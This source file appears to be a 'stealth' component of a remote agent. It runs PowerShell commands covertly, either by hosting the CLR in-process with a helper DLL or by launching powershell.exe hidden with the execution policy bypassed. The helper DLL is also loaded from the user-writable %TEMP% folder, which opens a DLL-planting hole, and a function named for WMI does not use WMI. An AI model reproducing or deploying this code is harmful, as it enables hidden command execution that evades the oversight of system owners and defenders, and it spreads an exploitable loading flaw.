/*
 * MeshAgent Stealth - In-process PowerShell Host (CLR)
 *
 * Attempts to host the .NET CLR (v4) and execute a managed helper
 * assembly that runs a PowerShell Runspace in-process. If CLR hosting
 * or the helper assembly is unavailable, falls back to invoking
 * powershell.exe hidden with output capture.
 */

#include <windows.h>
#include <mscoree.h>
#include <strsafe.h>
#include "stealth.h"

#pragma comment(lib, "mscoree.lib")

typedef HRESULT (STDAPICALLTYPE *CLRCreateInstance_t)(REFCLSID clsid, REFIID riid, LPVOID *ppInterface);

static BOOL RunPowerShellViaCLR(const wchar_t* helperPath, const wchar_t* typeName, const wchar_t* methodName, const wchar_t* command, wchar_t* outBuf, size_t outCch)
{
    HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
    if (!hMscoree) { return FALSE; }

    CLRCreateInstance_t pCLRCreateInstance = (CLRCreateInstance_t)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!pCLRCreateInstance) { FreeLibrary(hMscoree); return FALSE; }

    ICLRMetaHost* pMeta = NULL;
    HRESULT hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMeta));
    if (FAILED(hr) || !pMeta) { FreeLibrary(hMscoree); return FALSE; }

    ICLRRuntimeInfo* pInfo = NULL;
    hr = pMeta->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&pInfo));
    if (FAILED(hr) || !pInfo) { pMeta->Release(); FreeLibrary(hMscoree); return FALSE; }

    BOOL bLoadable = FALSE;
    hr = pInfo->IsLoadable(&bLoadable);
    if (FAILED(hr) || !bLoadable) { pInfo->Release(); pMeta->Release(); FreeLibrary(hMscoree); return FALSE; }

    ICLRRuntimeHost* pHost = NULL;
    hr = pInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pHost));
    if (FAILED(hr) || !pHost) { pInfo->Release(); pMeta->Release(); FreeLibrary(hMscoree); return FALSE; }

    hr = pHost->Start();
    if (FAILED(hr)) { pHost->Release(); pInfo->Release(); pMeta->Release(); FreeLibrary(hMscoree); return FALSE; }

    // ExecuteInDefaultAppDomain requires a static method with signature:
    // int Method(string arg)
    // We’ll pass the command, and method should return exit code and write output
    DWORD dwRet = 0;
    hr = pHost->ExecuteInDefaultAppDomain(helperPath, typeName, methodName, command, &dwRet);

    // We can’t get string output directly via ExecuteInDefaultAppDomain. The helper should
    // write to a well-known temp file. Read that here if dwRet == 0.
    BOOL ok = FALSE;
    if (SUCCEEDED(hr) && dwRet == 0)
    {
        // Read %TEMP%\\pshost.out if present
        wchar_t tempPath[MAX_PATH] = {0};
        if (GetTempPathW(MAX_PATH, tempPath) > 0)
        {
            wchar_t outPath[MAX_PATH] = {0};
            StringCchPrintfW(outPath, MAX_PATH, L"%spshost.out", tempPath);
            HANDLE hf = CreateFileW(outPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hf != INVALID_HANDLE_VALUE)
            {
                DWORD size = GetFileSize(hf, NULL);
                if (size > 0)
                {
                    // Simple read (truncate if exceeds)
                    DWORD rd = 0;
                    DWORD toRead = (DWORD)min((size_t)size, (outCch - 1) * sizeof(wchar_t));
                    ReadFile(hf, outBuf, toRead, &rd, NULL);
                    outBuf[toRead / sizeof(wchar_t)] = L'\0';
                    ok = TRUE;
                }
                CloseHandle(hf);
                DeleteFileW(outPath);
            }
        }
    }

    pHost->Release();
    pInfo->Release();
    pMeta->Release();
    FreeLibrary(hMscoree);
    return ok;
}

static BOOL RunPowerShellExternalHidden(const wchar_t* command, wchar_t* outBuf, size_t outCch)
{
    // Fallback: powershell.exe hidden with output capture via Stealth_ExecuteCmdHidden
    char cmdA[4096] = {0};
    char outA[131072] = {0};

    // Quote and prepare command: powershell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "..."
    // NOTE: Caller ensures command is trusted/already sanitized.
    StringCchPrintfA(cmdA, 4096, "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"%S\"", command);
    if (!Stealth_ExecuteCmdHidden(cmdA, outA, sizeof(outA))) { return FALSE; }

    // Convert to wide
    MultiByteToWideChar(CP_UTF8, 0, outA, -1, outBuf, (int)outCch);
    return TRUE;
}

BOOL Stealth_ExecutePowerShellViaWMI(const char* commandUtf8, char* outputUtf8, size_t outputSize)
{
    if (!commandUtf8 || !outputUtf8 || outputSize == 0) { return FALSE; }

    // Convert command to wide
    wchar_t commandW[8192] = {0};
    MultiByteToWideChar(CP_UTF8, 0, commandUtf8, -1, commandW, 8192);

    // Build path to helper DLL beside the service (optional deployment), else expect in %TEMP%
    wchar_t helperPath[MAX_PATH] = {0};
    DWORD n = GetModuleFileNameW(NULL, helperPath, MAX_PATH);
    if (n > 0)
    {
        // Replace filename with PsRunspaceHelper.dll
        wchar_t* p = wcsrchr(helperPath, L'\\');
        if (p) { *p = L'\0'; }
        StringCchCatW(helperPath, MAX_PATH, L"\\PsRunspaceHelper.dll");
    }

    wchar_t outW[131072] = {0};

    // Try CLR hosting first (if helper is present)
    BOOL ok = FALSE;
    if (GetFileAttributesW(helperPath) != INVALID_FILE_ATTRIBUTES)
    {
        ok = RunPowerShellViaCLR(helperPath, L"PsHost.Runner", L"Run", commandW, outW, _countof(outW));
    }

    if (!ok)
    {
        // Try %TEMP%\PsRunspaceHelper.dll
        wchar_t tempPath[MAX_PATH] = {0};
        if (GetTempPathW(MAX_PATH, tempPath) > 0)
        {
            wchar_t tempHelper[MAX_PATH] = {0};
            StringCchPrintfW(tempHelper, MAX_PATH, L"%sPsRunspaceHelper.dll", tempPath);
            if (GetFileAttributesW(tempHelper) != INVALID_FILE_ATTRIBUTES)
            {
                ok = RunPowerShellViaCLR(tempHelper, L"PsHost.Runner", L"Run", commandW, outW, _countof(outW));
            }
        }
    }

    if (!ok)
    {
        // Fallback to external powershell.exe hidden
        ok = RunPowerShellExternalHidden(commandW, outW, _countof(outW));
    }

    if (!ok)
    {
        return FALSE;
    }

    // Convert wide output back to UTF-8
    int need = WideCharToMultiByte(CP_UTF8, 0, outW, -1, NULL, 0, NULL, NULL);
    if (need <= 0 || (size_t)need > outputSize) { return FALSE; }
    WideCharToMultiByte(CP_UTF8, 0, outW, -1, outputUtf8, (int)outputSize, NULL, NULL);
    return TRUE;
}

